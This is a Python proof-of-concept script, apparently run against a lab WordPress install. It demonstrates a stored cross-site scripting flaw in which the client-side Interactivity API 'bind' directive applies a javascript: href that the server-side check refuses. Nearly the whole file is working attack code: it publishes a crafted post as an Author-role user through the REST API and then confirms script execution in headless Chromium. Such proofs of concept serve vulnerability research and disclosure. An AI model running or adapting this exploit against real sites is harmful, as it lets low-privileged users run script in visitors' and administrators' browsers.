#!/usr/bin/env python3
"""
Server vs client disagreement in the Interactivity API's `bind` directive.

WP_HTML_Tag_Processor::set_attribute() runs esc_url() on every attribute in
wp_kses_uri_attributes(), so the SERVER refuses to write href="javascript:...".
The client runtime (wp-includes/js/dist/script-modules/interactivity/index.js,
`directive("bind", ...)`) has no equivalent check -- href is explicitly routed
to el.setAttribute() with the raw value.

So an Author (no unfiltered_html) plants the island in post content, kses keeps
the data-wp-* attributes (they are `data-*` globals), the server declines the
binding, and then the browser applies it anyway.
"""
import json
import re
import requests
from playwright.sync_api import sync_playwright
from wplab import sess, BASE

CHROME = "/opt/pw-browsers/chromium-1194/chrome-linux/chrome"

author = sess("author")
anon = requests.Session()

PAYLOAD = (
    """<p data-wp-interactive='{"namespace":"pwn"}' """
    """data-wp-context='{"u":"javascript:window.__PWNED__=document.domain;void 0"}'>"""
    """<a id="pwnlink" data-wp-bind--href="context.u">MARKER_HREF</a></p>"""
)

j = author.rest("POST", "/wp/v2/posts", json={
    "title": "iapi browser bind href", "content": PAYLOAD, "status": "publish"}).json()
pid = j["id"]
url = BASE + f"/?p={pid}"
print("post id :", pid)
print("url     :", url)

html = anon.get(url).text
m = re.search(r'<a id="pwnlink"[^>]*>', html)
print("\n[1] server-rendered anchor (esc_url refused the binding):")
print("   ", m.group(0) if m else "NOT FOUND")
print("    interactivity runtime present on page:",
      "script-modules/interactivity/index.min.js" in html)

with sync_playwright() as p:
    b = p.chromium.launch(executable_path=CHROME, args=["--no-sandbox"])
    page = b.new_page()
    logs = []
    page.on("console", lambda msg: logs.append(f"{msg.type}: {msg.text}"))
    page.goto(url, wait_until="networkidle")
    page.wait_for_timeout(1500)

    href = page.eval_on_selector("#pwnlink", "el => el.getAttribute('href')")
    print("\n[2] after client hydration, the DOM attribute is:")
    print("    href =", json.dumps(href))

    if href and href.lower().startswith("javascript:"):
        page.click("#pwnlink")
        page.wait_for_timeout(800)
        pwned = page.evaluate("() => window.__PWNED__ || null")
        print("\n[3] clicking the link executed script in the page origin:")
        print("    window.__PWNED__ =", json.dumps(pwned))
    else:
        print("\n[3] not exploitable via href on this build")

    print("\nconsole:", logs[:6])
    b.close()
